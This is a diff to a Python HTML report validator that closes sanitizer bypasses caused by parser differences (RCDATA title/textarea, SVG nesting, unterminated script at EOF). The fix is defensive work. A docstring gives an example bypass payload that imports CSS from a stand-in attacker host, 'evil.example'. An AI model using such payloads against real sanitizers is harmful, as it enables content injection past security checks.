@@ -191,7 +191,62 @@ class ReportParser(HTMLParser):
     """検証に必要な構造情報を 1 パスで収集する parser。
 
     判定ロジックは持たず、収集した事実（タグ・属性・階層）を checks 側で評価する。
+
+    RCDATA_CONTENT_ELEMENTS（Python 3.12 で追加された、title / textarea を
+    どこに現れても無条件で RCDATA 扱いする class 変数）を、SVG 内かどうかで
+    切り替える property として上書きする。ブラウザの挙動は文脈で分かれる:
+
+    - SVG 配下（foreign-content）の title/textarea: HTML5 tree builder の
+      仕様上 RCDATA へ切り替えず通常の子要素として解釈し、ネストした
+      <style>/<script> を実際に適用・実行する。html.parser 3.12+ の
+      RCDATA_CONTENT_ELEMENTS はこの namespace を知らず、ここでも RCDATA
+      扱いしてバッファに畳み込むため、CSS/script 検査（styles / scripts
+      への収集）から露出しない fail-open が生じていた（Issue #221、
+      Python 3.12.12 で実測）。→ SVG 内では RCDATA を無効化して通常要素
+      として解析し、ネストした要素を検査に露出させる。
+    - 非 SVG（通常 HTML）の title/textarea: ブラウザは実際に RCDATA として
+      扱い、開始タグが閉じた後の内容はタグとして解釈せず、リテラルな
+      終了タグ文字列（`</title` 等）が現れるまでそのままテキストとして
+      表示する。ここで RCDATA を無効化すると、python は逆に「通常の子要素
+      解析」に切り替わってしまい、ブラウザには存在しない `<style>` 要素を
+      誤って検出（過剰拒否）する一方で、title/textarea の子孫要素の
+      「属性値」に含まれる literal `</title>` でブラウザ側が RCDATA を
+      早期終了させ、後続の実在タグ（`<style>@import ...` 等）を適用・実行
+      するケース（例: `<title><i data-x="</title><style>@import
+      url(https://evil.example/x.css)</style>"></i></title>`）を python は
+      `<i>` 要素の属性値としてまるごと飲み込んでしまい検査から漏らす
+      （Bugbot 指摘、PR #227）。→ 非 SVG では RCDATA を有効なままにし、
+      html.parser のリテラル終了タグ探索（`</`+空白+`title` 相当）でブラウザと
+      同じ位置で cdata を終端させる。
+
+    この文脈依存判定は「現在のタグスタックに svg 祖先が含まれるか」で行う
+    （下記 RCDATA_CONTENT_ELEMENTS property 内の判定式）。html.parser の
+    RCDATA 判定は handle_starttag 呼び出し直後（このタグ自身が _stack に push された後）
+    に行われるため、判定時点の _stack を見れば「このタグの祖先に svg が
+    あるか」を正しく判定できる（このタグ自身は title/textarea であり
+    svg ではないため誤判定なし）。_svg_stack（開いている <svg> の入れ子
+    スタック）ではなく _stack 全体を走査するのは、RCDATA 判定が
+    handle_starttag 直後の呼び出しタイミングに依存し、タグスタックの方が
+    判定時点の祖先関係を直接表すため（svg の追跡自体も入れ子対応の
+    スタック管理であり、内側の </svg> 後も外側の追跡を維持する）。
+
+    さらに、RCDATA_CONTENT_ELEMENTS 自体は Python 3.12+ にしか存在せず
+    3.11 以前ではこの property は no-op になる。バージョン非依存の防御として、
+    handle_starttag で全属性の生の値に `</title` / `</textarea`
+    （大小文字問わず）が含まれる場合は、実際にそのタグが RCDATA 内か
+    どうかに関わらず存在自体を不合格にする（renderer はこの文字列パターンを
+    生成しないため誤検知の実害はない）。
     """
+
+    @property
+    def RCDATA_CONTENT_ELEMENTS(self):
+        # SVG 祖先内では RCDATA を無効化（空タプル）、それ以外では 3.12+ の既定
+        # ("textarea", "title") のままブラウザの RCDATA 挙動に追従する。
+        # __init__ で super().__init__() が _stack より先に走るため、
+        # 生成直後の内部呼び出しに備えて getattr で安全に参照する。
+        if any(t == "svg" for t, _ in getattr(self, "_stack", ())):
+            return ()
+        return ("textarea", "title")
 
     def __init__(self):
         super().__init__(convert_charrefs=True)
@@ -209,12 +264,13 @@ class ReportParser(HTMLParser):
         self.anchor_hrefs = []      # <a href> の値（出典リンク検査用）
         self.style_attr_external = []
         self.title_text = ""
+        self.unterminated_rawtext = None  # EOF 時に未終端だった rawtext 要素名（close で設定）
         self.meta_charset = False
         self.meta_viewport = False
         self._stack = []            # (tag, classes) の祖先スタック
         self._in = None             # "script" | "style" | "title" | "svg-title" | "svg-desc"
         self._buf = ""
-        self._cur_svg = None
+        self._svg_stack = []        # 開いている <svg> の入れ子スタック（末尾が現在の svg）
         self._cur_table = None
 
     # -- 補助 ---------------------------------------------------------------
@@ -238,6 +294,16 @@ class ReportParser(HTMLParser):
         # 成立するため、renderer が生成しないこの構文自体を禁止する
         # （script は check #6 の完全一致ゲートでも落ちるが、意図した防御と
         # して明示的に閉じる）。
+        #
+        # 評価（Issue #221）: top-level の self-closing 形式（<textarea/> 等）
+        # 自体は html.parser が startendtag として処理し RCDATA モードへ
+        # 入らないため、後続の <style>/<script> は通常タグとして既存の
+        # CSS/script 検査に露出する（この経路に迂回はない）。SVG foreign-content
+        # 内の <title>/<textarea> ネストは RCDATA_CONTENT_ELEMENTS の
+        # 文脈依存 property（クラス docstring 参照）で塞いだ。属性値に
+        # literal `</title` 等を仕込む exit-point 差（PR #227, Bugbot 指摘）は
+        # handle_starttag 側のバージョン非依存ガード（同 docstring 参照）で
+        # 別途塞いでいる。
         if tag in ("style", "script", "title"):
             self.external_refs.append(
                 f"<{tag}/>（RAWTEXT/RCDATA 要素の自己終了形式はブラウザとの"
@@ -247,6 +313,28 @@ class ReportParser(HTMLParser):
         self.handle_endtag(tag)
 
     def handle_starttag(self, tag, attrs):
+        # RCDATA exit-point 差のバージョン非依存ガード（クラス docstring 参照、
+        # PR #227 Bugbot 指摘）。RCDATA_CONTENT_ELEMENTS property は Python
+        # 3.12+ にしか存在せず、3.11 以前では常に no-op（title/textarea が
+        # RCDATA 化されないため html.parser 標準の通常要素解析のみ）。
+        # non-SVG の title/textarea を RCDATA のまま維持するバージョンでも、
+        # その子孫要素の属性値に literal `</title` / `</textarea` を仕込むと、
+        # ブラウザの RCDATA スキャンはクォート文脈を無視してその位置で
+        # title/textarea を終了し、後続の実在タグ（<style>/<script> 等）を
+        # 通常要素として適用・実行する。html.parser はこの属性値を最初から
+        # 「まだ閉じていないタグの属性」として quote 文脈込みで解析するため
+        # 位置がずれず、後続タグが丸ごと属性値に飲み込まれて検査から漏れる。
+        # 重複排除前の raw attrs を見るのは、dict 畳み込み後の属性のみ
+        # チェックすると同名属性の 2 個目以降（ブラウザは無視するが検査は
+        # 生バイト列全体を見る必要がある）に紛れ込ませて迂回されるため。
+        for _, av in attrs:
+            low = (av or "").lower()
+            if "</title" in low or "</textarea" in low:
+                self.external_refs.append(
+                    f"<{tag}>（属性値に RCDATA 終了タグ文字列を含む記述は"
+                    "ブラウザとの解析差による検査迂回のため禁止）")
+                break
+
         # 重複属性は先勝ちで畳み込む（HTML5 仕様・ブラウザ挙動と一致させる）。
         # html.parser は重複属性を除去せず list のまま返すため、dict(attrs) の
         # 後勝ちだと <a href="javascript:..." href="https://ok/"> のような重複で
@@ -366,23 +454,32 @@ class ReportParser(HTMLParser):
         if tag in ("h1", "h2", "h3", "h4", "h5", "h6"):
             self.headings.append(int(tag[1]))
 
-        # SVG 内の子要素数を数える（is_chart_svg の「意味論的 SVG」判定材料）
-        if self._cur_svg is not None and tag != "svg":
-            self._cur_svg["elems"] += 1
+        # SVG 内の子要素数を数える（is_chart_svg の「意味論的 SVG」判定材料）。
+        # 入れ子 svg に備えてスタック管理し、内側の </svg> 後も外側の追跡を維持する
+        # （単一値だと内側を閉じた時点で外側の elems 加算・title/desc 帰属が失われ、
+        # accessible name 検査を要素数不足で迂回できる。codex P2 / Bugbot 指摘）
+        if self._svg_stack and tag != "svg":
+            self._svg_stack[-1]["elems"] += 1
         if tag == "svg":
-            self._cur_svg = {
+            cur = {
                 "attrs": ad,
                 "in_chart_wrap": self._has_ancestor_class("chart-wrap"),
                 "has_title": False,
                 "has_desc": False,
                 "classes": classes,
                 "elems": 0,
+                "label_ids": set(),  # この svg 直下階層の title/desc の id 集合
             }
-            self.svgs.append(self._cur_svg)
-        if tag == "title" and self._cur_svg is not None:
-            self._cur_svg["has_title"] = True
-        if tag == "desc" and self._cur_svg is not None:
-            self._cur_svg["has_desc"] = True
+            self._svg_stack.append(cur)
+            self.svgs.append(cur)
+        if tag == "title" and self._svg_stack:
+            self._svg_stack[-1]["has_title"] = True
+            if ad.get("id"):
+                self._svg_stack[-1]["label_ids"].add(ad["id"])
+        if tag == "desc" and self._svg_stack:
+            self._svg_stack[-1]["has_desc"] = True
+            if ad.get("id"):
+                self._svg_stack[-1]["label_ids"].add(ad["id"])
 
         if tag == "table":
             self._cur_table = {
@@ -400,16 +497,25 @@ class ReportParser(HTMLParser):
             self._in, self._buf = "script", ""
         elif tag == "style":
             self._in, self._buf = "style", ""
-        elif tag == "title" and self._cur_svg is None:
+        elif tag == "title" and not self._svg_stack:
             self._in, self._buf = "title", ""
 
         self._stack.append((tag, classes))
 
     def handle_endtag(self, tag):
-        # 閉じタグに対応する開始タグまでスタックを巻き戻す（多少の不整合に耐える）
+        # 閉じタグに対応する開始タグまでスタックを巻き戻す（多少の不整合に耐える）。
+        # 巻き戻しで svg / table の開始タグが除去される場合は追跡状態も同期して
+        # 破棄する（_stack だけ巻き戻すと閉じ済み svg が _svg_stack に残り、後続の
+        # title/desc が誤帰属して accessible name 検査を偽装できる。Bugbot 指摘）
         for i in range(len(self._stack) - 1, -1, -1):
             if self._stack[i][0] == tag:
+                removed = self._stack[i:]
                 del self._stack[i:]
+                for rtag, _ in removed:
+                    if rtag == "svg" and self._svg_stack:
+                        self._svg_stack.pop()
+                    elif rtag == "table":
+                        self._cur_table = None
                 break
         if tag == "script" and self._in == "script":
             self.scripts.append(self._buf)
@@ -420,14 +526,30 @@ class ReportParser(HTMLParser):
         elif tag == "title" and self._in == "title":
             self.title_text = self._buf.strip()
             self._in = None
-        if tag == "svg":
-            self._cur_svg = None
-        if tag == "table":
-            self._cur_table = None
+        # svg / table の追跡破棄は上記の巻き戻し同期に一本化している（対応する
+        # 開始タグが _stack に無い迷子の閉じタグでは何も pop しない。開いたままの
+        # 外側 svg の追跡を誤破棄しない fail-safe）
 
     def handle_data(self, data):
         if self._in in ("script", "style", "title"):
             self._buf += data
+
+    def close(self):
+        # EOF 時に script/style/title が未終端のまま残っている場合の fail-closed 処理。
+        # handle_endtag でしか _buf を scripts/styles へ移さないと、閉じタグを欠いた
+        # `<script>fetch(...)` 等が全セキュリティ検査を素通りする（codex P0 指摘）。
+        # 未終端バッファを対応する検査対象へ必ず移したうえで、未終端の事実自体も
+        # unterminated_rawtext に記録し、run_checks 側で無条件に不合格へ倒す。
+        super().close()
+        if self._in in ("script", "style", "title"):
+            self.unterminated_rawtext = self._in
+            if self._in == "script":
+                self.scripts.append(self._buf)
+            elif self._in == "style":
+                self.styles.append(self._buf)
+            else:
+                self.title_text = self._buf.strip()
+            self._in = None
 
 
 # ---------------------------------------------------------------------------
@@ -455,6 +577,13 @@ def run_checks(path):
     parser = ReportParser()
     parser.feed(raw)
     parser.close()
+
+    # 1.5. rawtext 要素の未終端検査（fail-closed）。閉じタグのない script/style は
+    # ブラウザ実装依存の解釈になり検査結果の信頼性が保てないため、内容の検査結果に
+    # かかわらず無条件で不合格にする（codex P0: EOF 迂回の遮断）
+    check("script/style/title が EOF まで正しく閉じている",
+          parser.unterminated_rawtext is None,
+          f"未終端の <{parser.unterminated_rawtext}> がある" if parser.unterminated_rawtext else "")
 
     # 2. 文書骨格
     check("doctype 宣言がある", parser.has_doctype)
@@ -527,8 +656,16 @@ def run_checks(path):
     for i, s in enumerate(parser.svgs):
         a = s["attrs"]
         if is_chart_svg(s):
-            ok = (a.get("role") == "img" and a.get("aria-labelledby")
-                  and s["has_title"] and s["has_desc"])
+            # aria-labelledby は空でないだけでなく、全トークンが同一 SVG 内の
+            # title/desc の実在 id を参照していることまで検証する（存在しない
+            # ID の参照は accessible name 不成立。codex P2 指摘）
+            # 値なし属性（<svg aria-labelledby>）は html.parser が None を返すため
+            # or "" で正規化する（None.split() のクラッシュ防止。Bugbot 指摘）
+            labelledby = a.get("aria-labelledby") or ""
+            tokens = labelledby.split()
+            ok = (a.get("role") == "img" and bool(tokens)
+                  and s["has_title"] and s["has_desc"]
+                  and all(t in s["label_ids"] for t in tokens))
         else:
             ok = a.get("aria-hidden") == "true"
         if not ok:
